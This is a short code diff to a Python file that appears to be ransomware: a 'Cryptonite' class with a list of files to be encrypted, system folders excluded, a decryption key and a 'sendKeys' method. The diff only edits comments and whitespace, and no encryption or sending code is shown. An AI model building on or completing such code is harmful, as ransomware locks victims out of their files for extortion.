@@ -24,7 +24,7 @@ EXCLUDED_DIRS = [   "/Windows",
                     "/Program Files (x86)",
                     "/AppData"
                 ]
-
+# keeps track of files
 fileLists = []      # stores the files to be encrypted
 fileList = [] 
 
@@ -36,9 +36,7 @@ class Cryptonite():
 
         self.decryptPlease = dkrpt
         self.uniqueKey = uniqKey
-
-              # stores the files to be decrypted
-
+        
 
     def sendKeys(self):
         id = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
